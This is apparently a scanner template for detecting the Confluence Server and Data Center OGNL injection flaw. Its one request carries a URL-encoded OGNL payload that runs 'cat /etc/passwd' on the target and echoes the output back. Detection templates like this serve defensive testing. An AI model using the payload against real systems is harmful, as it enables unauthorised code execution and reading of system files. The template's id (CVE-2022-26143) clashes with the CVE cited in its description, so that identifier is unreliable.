id: CVE-2022-26143
info:
  author: jijue
  description: "\u8FD1\u65E5\uFF0CAtlassian\u5B98\u65B9\u53D1\u5E03\u4E86Confluence\
    \ Server\u548CData Center OGNL \u6CE8\u5165\u6F0F\u6D1E\uFF08CVE-2022-26134\uFF09\
    \u7684\u5B89\u5168\u516C\u544A\uFF0C\n\u8FDC\u7A0B\u653B\u51FB\u8005\u5728\u672A\
    \u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u60C5\u51B5\u4E0B\uFF0C\u53EF\u6784\u9020\
    OGNL\u8868\u8FBE\u5F0F\u8FDB\u884C\u6CE8\u5165\uFF0C\u5B9E\u73B0\u5728Confluence\
    \ Server\u6216Data Center\u4E0A\u6267\u884C\u4EFB\u610F\u4EE3\u7801\uFF0CCVSS\u8BC4\
    \u5206\u4E3A10\u3002\n\u53D7\u5F71\u54CD\u7248\u672C\uFF1A\nConfluenceServerandDataCenter>=1.3.0\n\
    ConfluenceServerandDataCenter<7.4.17\nConfluenceServerandDataCenter<7.13.7\nConfluenceServerandDataCenter<7.14.3\n\
    ConfluenceServerandDataCenter<7.15.2\nConfluenceServerandDataCenter<7.16.4\nConfluenceServerandDataCenter<7.17.4\n\
    ConfluenceServerandDataCenter<7.18.1\napp=\"ATLASSIAN-Confluence\"\n"
  expression: r0()
  name: "Atlassian Confluence OGNL\u8868\u8FBE\u5F0F\u6CE8\u5165\u6F0F\u6D1E"
  rules:
    r0:
      expression: response.status == 302 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
      request:
        method: GET
        path: /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22cat%20/etc/passwd%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/
  severity: high
  verified: false
